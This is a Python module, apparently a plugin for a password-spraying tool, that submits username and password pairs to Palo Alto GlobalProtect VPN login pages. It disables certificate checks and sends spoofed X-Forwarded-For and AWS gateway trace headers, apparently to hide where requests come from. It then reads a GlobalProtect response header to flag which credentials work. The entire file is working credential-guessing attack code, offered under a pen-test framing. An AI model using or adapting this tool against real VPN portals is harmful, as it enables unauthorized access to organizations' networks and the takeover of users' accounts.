import requests
from urllib.parse import urlparse
import utils.utils as utils

# Deliberately disable warnings since verify=False is intended in pen-test contexts
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def globalprotect_authenticate(target_url, username, password, useragent, pluginargs):
    """
    Attempts a GlobalProtect web-auth POST.
    Returns a dict with keys: result ("success"|"failure"|"potential"), error (bool), output (str), valid_user (bool)
    pluginargs is expected to be a dict and may contain:
      - "proxy" : proxy dict for requests (optional)
      - any custom headers will be added via utils.add_custom_headers
    """

    data_response = {
        'result': None,        # "success", "failure" or "potential"
        'error': False,
        'output': "",
        'valid_user': False
    }

    # Spofing/trace headers similar to your Fortinet module
    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    post_url = f"{base}/global-protect/login.esp"

    headers = {
        'User-Agent': useragent,
        'X-My-X-Forwarded-For': spoofed_ip,
        'x-amzn-apigateway-api-id': amazon_id,
        'X-My-X-Amzn-Trace-Id': trace_id,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base,
        'Referer': post_url
    }

    # Allow caller to inject/override headers
    headers = utils.add_custom_headers(pluginargs, headers)

    # Form fields 
    post_params = {
        "prot": "https:", 
        "server": parsed.hostname or "",
        "inputStr": "",
        "action": "getsoftware",
        "user": username,
        "passwd": password,
        "new-passwd": "",
        "confirm-new-passwd": "",
        "ok": "Log In"
    }

    # Prepare proxies if provided 
    proxies = pluginargs.get("proxy") if isinstance(pluginargs, dict) else None

    try:
        # Use a Session to mimic persistent client behavior (cookies, etc.)
        with requests.Session() as s:
            s.verify = False  # intentionally disabled for pen-test parity
            resp = s.post(post_url, headers=headers, data=post_params, verify=False,
                          proxies=proxies, timeout=15, allow_redirects=True)

        # default assumption: failure
        data_response['result'] = "failure"
        data_response['output'] = f"[-] FAILURE: HTTP {resp.status_code} => {username}:{password}"

        # Quick heuristic: status code not equal to 512 may indicate something to look at
        if resp.status_code and resp.status_code != 512:
            # mark as potential until header/body checks confirm
            data_response['result'] = "potential"
            data_response['output'] = f"[~] POTENTIAL: HTTP {resp.status_code} => {username}:{password}"

        # Body-based checks
        body = resp.text or ""
        if "Valid client certificate is required" in body:
            # informative, not a success
            data_response['output'] += " | Client certificate required to authenticate."

        # Header-based GlobalProtect check — this is the most reliable indicator observed
        gp_hdr = resp.headers.get("x-private-pan-globalprotect")
        if gp_hdr is not None:
            gp_val = gp_hdr.strip().lower()
            # If header is present and NOT one of the known failure tokens -> success
            if gp_val not in ("auth-failed", "auth-failed-invalid-user-input"):
                data_response['result'] = "success"
                data_response['valid_user'] = True
                data_response['output'] = f"[+] SUCCESS: => {username}:{password}"
            else:
                data_response['output'] = f"[-] FAILURE ({gp_val}): {username}:{password}"
        else:
            # Header missing — we cannot be confident. Keep whatever 'result' we derived above.
            data_response['output'] += " | Missing header 'x-private-pan-globalprotect'; outcome uncertain."

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = f"[!] EXCEPTION: {repr(ex)}"

    return data_response